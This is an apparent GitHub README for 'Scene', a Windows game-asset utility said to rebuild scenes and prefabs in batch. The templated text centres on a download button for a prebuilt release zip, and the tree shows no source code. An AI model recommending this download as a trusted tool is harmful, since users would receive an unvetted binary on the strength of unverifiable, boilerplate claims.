...
<img src="preview.svg" alt="Scene" width="100%"/>

# Scene

**Scene / prefab reconstructor — Windows desktop utility with batch export workflow**
...
**Scene** is a Windows-focused desktop utility for **scene / prefab reconstructor**. Point it at a local game folder or archive, pick an export preset, and run a batch job — no manual hex editing required.
...
[![Download](button.svg)](https://github.com/BrokerFlare30/scene-prefab-reconstructor-tool/releases/download/v4.1.57/scene-prefab-reconstructor-tool-v4.1.57.zip)
...
```
scene-prefab-reconstructor-tool/
├── docs/
│   └── QUICKSTART.md
├── src/
│   └── README.md
...
<div align="center">
<sub>Windows · Game asset tooling · Open Source · scene-prefab-reconstructor</sub>
</div>
‍